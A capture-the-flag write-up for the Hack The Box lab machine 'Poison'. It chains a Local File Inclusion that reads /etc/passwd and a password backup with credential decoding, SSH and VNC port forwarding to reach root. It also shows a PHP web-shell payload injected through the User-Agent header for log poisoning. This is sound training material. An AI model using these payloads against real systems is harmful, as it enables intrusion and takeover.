# 🧪 HTB - Poison Write-up

## 📌 Machine Information
- Name: Poison
- Platform: Hack The Box
- Difficulty: Medium
- OS: FreeBSD

---

## 🎯 Objective
Gain user and root access by identifying and exploiting vulnerabilities in the system.

---

## 🧠 Attack Overview

This machine demonstrates a full attack chain starting from a Local File Inclusion (LFI) vulnerability and ending in full system compromise.

Key techniques used:
- LFI exploitation
- Base64 decoding
- Credential reuse
- SSH access
- Port forwarding
- VNC exploitation

---

## 🔍 Enumeration

Nmap Scan:
nmap -p- -sC -sV 10.10.10.84

Findings:
- 22/tcp → SSH
- 80/tcp → HTTP


![nmap](images/nmap.png)

---

## 🌐 Web Enumeration

Discovered parameter:
browse.php?file=

This suggested a potential file inclusion vulnerability.

---

## 📂 LFI Exploitation

Test:
browse.php?file=/etc/passwd

✅ Confirmed LFI vulnerability

📸 Screenshot:
![lfi](images/lfi.png)

---

## 🔐 Credential Discovery

Accessed:
browse.php?file=pwdbackup.txt

- Contains Base64 encoded data repeated multiple times


![pwdbackup](images/pwdbackup.png)

---

## 🔄 Password Decoding

Python script used:

import base64

pwd = open('pwd.txt','r').read().strip()
for i in range(13):
    pwd = base64.b64decode(pwd)

print(pwd)

Recovered password:
Charix!2#4%6&8(0

📸 Screenshot:
![decode](images/decode.png)

---

## 🔓 Initial Access (SSH)

ssh charix@10.10.10.84

✅ Successful login

📸 Screenshot:
![ssh](images/ssh.png)

---

## 📦 Privilege Escalation

Found file:
secret.zip

Transferred and extracted:
scp charix@10.10.10.84:~/secret.zip .
unzip secret.zip

---

## 🔗 SSH Port Forwarding

ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84

---

## 🖥️ VNC Access

vncviewer 127.0.0.1:5901

- Used extracted credentials
- Gained root access

📸 Screenshot:
![vnc](images/vnc.png)

---

## 👑 Root Access

Root obtained through VNC session.

📸 Screenshot:
![root](images/root.png)

---

## 🔥 Alternative Exploitation Path (Log Poisoning)

Injected payload:
User-Agent: <?php system($_GET['cmd']); ?>

Triggered execution:
browse.php?file=/var/log/httpd-access.log&cmd=id

---

## 🧠 Lessons Learned

- LFI can lead to RCE through log poisoning
- Base64 encoding is not secure
- Always check backup files and logs
- Credential reuse is a common weakness

---

## 📊 Attack Chain

LFI → Credential Extraction → SSH Access → Local File Discovery → VNC → Root

---

## ✅ Conclusion

This machine highlights how a seemingly low-impact vulnerability like LFI can escalate into full system compromise through proper enumeration and chaining techniques.
